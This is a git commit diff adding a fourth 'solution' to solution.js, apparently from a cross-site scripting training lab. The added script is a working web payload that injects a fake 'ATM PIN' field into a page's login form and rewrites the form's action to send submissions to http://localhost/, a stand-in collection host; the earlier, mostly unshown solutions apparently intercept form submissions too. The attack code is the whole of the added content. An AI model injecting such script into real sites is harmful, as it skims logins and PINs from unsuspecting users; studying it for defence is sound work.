79947a1b10c5b52032b644677ca5ecf059253aa1
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2021-05-31 20:25:05 +0200

    Update solution.js

--- solution.js
+++ solution.js
@@ -39,3 +39,21 @@ function InterceptForm()
 document.forms[0].onsubmit = InterceptForm;
 
 </script>
+
+
+* Solution 4: Modifying Form Fields
+
+<script>
+
+var input = document.createElement("input");
+
+input.setAttribute("type", "text");
+input.setAttribute("class", "input-block-level");
+input.setAttribute("placeholder", "ATM PIN");
+input.setAttribute("name", "atmpin");
+
+var previous = document.forms[0].elements[0];
+document.forms[0].insertBefore(input, previous);
+document.forms[0].action = "http://localhost/";
+
+</script>
